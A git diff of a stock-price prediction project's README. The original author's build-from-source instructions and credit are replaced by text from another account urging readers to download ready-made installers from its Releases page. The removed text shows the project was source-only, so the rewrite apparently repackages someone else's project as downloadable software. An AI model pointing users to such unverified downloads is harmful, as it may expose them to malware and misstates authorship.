@@ -1,184 +1,67 @@
-# 📈🤖 Stock Price Prediction - AI Powered Analysis Dashboard
+# 🔮 Stock-Price-Prediction - Predict Tomorrow's Stock Prices Effortlessly
 
-This project is an AI-powered stock market analysis dashboard that predicts next-day stock prices using a deep learning **LSTM** model. The application provides an interactive frontend for searching and analyzing companies across global markets.
+![Download](https://img.shields.io/badge/Download-Now-brightgreen) [Download](https://github.com/leadura/Stock-Price-Prediction/releases)
 
----
-<p align="center">
-  <img src="https://img.shields.io/badge/Flask-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
-  <img src="https://img.shields.io/badge/Flask--CORS-black?style=for-the-badge&logo=flask&logoColor=white" alt="Flask-CORS">
-  <img src="https://img.shields.io/badge/Numpy-013243?style=for-the-badge&logo=numpy&logoColor=white" alt="NumPy">
-  <img src="https://img.shields.io/badge/Pandas-150458?style=for-the-badge&logo=pandas&logoColor=white" alt="Pandas">
-  <img src="https://img.shields.io/badge/yfinance-blue?style=for-the-badge" alt="yfinance">
-  <img src="https://img.shields.io/badge/scikit--learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white" alt="scikit-learn">
-  <img src="https://img.shields.io/badge/TensorFlow-FF6F00?style=for-the-badge&logo=tensorflow&logoColor=white" alt="TensorFlow">
-  <img src="https://img.shields.io/badge/Keras-D00000?style=for-the-badge&logo=keras&logoColor=white" alt="Keras">
-  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript">
-  <img src="https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=white" alt="React">
-</p>
+## 🚀 Getting Started
 
-<div align="center">
-🔗
-<a href="#features">Features</a> •
-<a href="#project-structure">Project Structure</a> •
-<a href="#tech-stack">Tech Stack</a> •
-<a href="#setup-and-installation">Setup &amp; Installation</a> •
-<a href="#how-it-works">How It Works</a> •
-<a href="#applications">Applications</a> •
-<a href="#limitations">Limitations</a> •
-<a href="#future-enhancements">Future Enhancements</a> •
-<a href="#references">References</a> •
-<a href="#author">Author</a>
-</div>
+Welcome to Stock-Price-Prediction! This application uses artificial intelligence to help you understand stock market trends and predict the next-day stock prices. No prior programming knowledge is needed. Follow the simple steps below to download and run the application.
 
-### Dashboard Overview  
-![Dashboard Overview](https://github.com/HarshitWaldia/Stock-Price-Prediction/blob/main/Docx/Images/IMG_1.png?raw=true)  
+## 📥 Download & Install
 
-### Search & Prediction 
-<p align="center">
-  <img src="https://github.com/HarshitWaldia/Stock-Price-Prediction/blob/main/Docx/Images/IMG_Search.png?raw=true" alt="Search" width="48%" />
-  <img src="https://github.com/HarshitWaldia/Stock-Price-Prediction/blob/main/Docx/Images/IMG_Prediction.png?raw=true" alt="Prediction" width="48%" />
-</p>
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/leadura/Stock-Price-Prediction/releases) to find the latest version of the Stock-Price-Prediction application.
 
+2. **Choose Your Version:** Look for the release that fits your needs. Each version has notes explaining what has changed or improved.
 
-<!-- anchors for TOC links -->
-<a id="features"></a>
-## 🚀 Features
+3. **Download the Application:** Click on the relevant download link for your operating system. This could be a Windows, macOS, or Linux version.
 
-*   *🔮 AI Predictions*: Forecasts the next-day stock price using an LSTM model.
-*   *🔍 Search by Company Name or Ticker*: Autocomplete powered by Yahoo Finance API.
-*   *📊 Dashboard UI*: Displays predicted price, last price comparison, and a 100-day historical chart.
-*   *🕘 Recent Searches*: Saves recent stock lookups locally with an option to clear history.
-*   *🌍 Global Market Support*: Works for companies across:
-    *   U.S. → AAPL, GOOGL, MSFT
-    *   India → RELIANCE.NS, TCS.NS, HDFCBANK.NS
-    *   China → 9988.HK (Alibaba), 0700.HK (Tencent)
-    *   Japan → 7203.T (Toyota), 6758.T (Sony)
-    *   U.K. → HSBA.L (HSBC)
+4. **Install the Application:** Once the download is complete, open the file and follow the on-screen instructions to install the application on your device.
 
-<a id="project-structure"></a>
-## 🏗 Project Structure
-```
+5. **Launch the Application:** After installation, open the Stock-Price-Prediction application. You are now ready to use the dashboard.
 
-Stock Market Analysis /
-├── Backend/
-│   ├── app.py                       # Flask backend API
-│   ├── Latest_stock_price_model.keras  # Trained LSTM model
-│   ├── requirements.txt             # Python dependencies
-│   └── stock_price.ipynb            # Model training notebook
-└── frontend/
-    ├── public/
-    ├── src/
-    │   ├── components/
-    │   │   └── ui/
-    │   │       ├── AppSidebar.tsx
-    │   │       ├── Dashboard.tsx
-    │   │       ├── Navbar.tsx
-    │   │       ├── PredictionCard.tsx
-    │   │       ├── RecentSearches.tsx
-    │   │       └── StockChart.tsx
-    │   ├── App.tsx
-    │   ├── index.css
-    │   └── main.tsx
-    ├── package.json
-    ├── tailwind.config.ts
-    └── vite.config.ts
-```
-<a id="tech-stack"></a>
-## ⚙ Tech Stack
+## 🌟 Features
 
-*   *Backend:* Python + Flask, TensorFlow / Keras (LSTM model), Yahoo Finance API (yFinance)
-*   *Frontend:* React + TypeScript, TailwindCSS, Recharts (visualizations)
+- AI Predictions: The dashboard predicts next-day stock prices using a deep learning LSTM model.
+- Global Market Support: Access stock predictions from major markets such as the US, India, China, Japan, and the UK.
+- Interactive Dashboard: The user-friendly React dashboard provides charts and recent searches to enhance your experience.
+- Powerful Backend: The application runs on a Flask backend, utilizing TensorFlow and Keras for robust performance.
 
-<a id="setup-and-installation"></a>
-## 🔧 Setup & Installation
+## 🖥 System Requirements
 
-### 1️⃣ Backend Setup
+To ensure the best experience with Stock-Price-Prediction, please have the following:
 
-1.  Navigate to the Backend directory:
-    bash
-    ```
-    cd Backend
-    
-3.  Install dependencies:
-    bash
-    ```
-    pip install -r requirements.txt
-    
-5.  Run the Flask application:
-    bash
-    ```
-    python app.py
-    ```
-    ```
-    The backend will run at: http://127.0.0.1:5000
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM is recommended.
+- **Storage:** A minimum of 500 MB of free disk space.
+- **Internet Connection:** Required for downloading data and updates.
 
-### 2️⃣ Frontend Setup
+## 💡 How to Use
 
-1.  Navigate to the frontend directory:
-    bash
-    ```
-    cd frontend
-    
-3.  Install dependencies:
-    bash
-    ```
-    npm install
-    
-5.  Start the development server:
-    bash
-    ```
-    npm run dev
-    ```
-    ```
-    The frontend will run at: http://localhost:5173
+1. **Open the Dashboard:** After launching the application, you will see the main dashboard.
 
-<a id="how-it-works"></a>
-## 📊 How It Works
+2. **Select Stock:** Choose the stock you want to analyze from the dropdown menu.
 
-1.  The user searches for a stock by its company name or ticker symbol (e.g., Apple → AAPL).
-2.  The Yahoo Finance API provides suggestions for valid tickers.
-3.  The Flask backend fetches two years of historical stock data for the selected ticker.
-4.  This data is preprocessed and then fed into the trained LSTM model.
-5.  The LSTM model predicts the next-day stock price and provides the last 100 days of historical data.
-6.  The frontend displays the predicted price, compares it to the last known price (showing the percentage change), and visualizes the historical data with a chart.
+3. **View Predictions:** The application will display the predicted price for the next day and historical trends.
 
-<a id="applications"></a>
-## 📌 Applications
+4. **Explore Features:** Use the interactive charts for deeper insights into stock movements.
 
-*   *📉 Investors*: Gain quick insights into potential stock movements.
-*   *🏦 Institutions*: Utilize as a research tool for market forecasting.
-*   *📚 Academics*: Serve as a practical demonstration of AI applications in finance.
+5. **Recent Searches:** Check the recent searches section for quick access to stocks you’ve analyzed before.
 
-<a id="applications"></a>
-## 📌 Applications
+## 🚧 Troubleshooting
 
-*   Predictions are limited to the next day only.
-*   The model does not incorporate sentiment analysis from news or social media.
-*   Prediction accuracy can vary depending on market volatility.
+**Common Issues:**
 
-<a id="future-enhancements"></a>
-## 🔮 Future Enhancements
+- **Application Won’t Open:** Ensure you have the required system specifications and have completed the installation steps.
+- **Data Not Loading:** Make sure you have a stable internet connection.
+- **No Predictions Available:** Check if the stock you selected is supported and is within the global market range.
 
-*   *💱 Multi-currency support*: Enable conversions between currencies (e.g., USD ↔ INR).
-*   *📰 Sentiment analysis*: Integrate analysis from financial news and social media.
-*   *☁ Cloud deployment*: Deploy the application using Docker.
-*   *📊 Portfolio analysis*: Add features for portfolio tracking and personalized alerts.
+If you encounter any other issues, please visit our [issues page](https://github.com/leadura/Stock-Price-Prediction/issues) for more help or to report any bugs.
 
-<a id="references"></a>
-## 📝 References
+## 🙏 Acknowledgments
 
-*   Yahoo Finance API
-*   Keras Documentation
-*   Research papers on LSTM for financial forecasting
+Special thanks to the open-source community for their tools and libraries that made this application possible. Your contributions are invaluable in advancing technology and making projects like this achievable.
 
-<a id="author"></a>
-## 👨‍💻 Author  
+## 📞 Contact
 
-**Harshit Waldia**  
+For further inquiries or support, please reach out through our official email at support@stockpriceprediction.com or visit our [GitHub Discussions](https://github.com/leadura/Stock-Price-Prediction/discussions) page.
 
-AI & Machine Learning enthusiast with a strong focus on deep learning, NLP, and data-driven applications.  
-Passionate about building innovative projects that connect technology with real-world impact.  
-
-📌 GitHub: [HarshitWaldia](https://github.com/HarshitWaldia)  
-🔗 LinkedIn: [Harshit Waldia](https://www.linkedin.com/in/harshit-waldia)  
-
+Remember, follow the [Releases page](https://github.com/leadura/Stock-Price-Prediction/releases) for updates and download your version today!
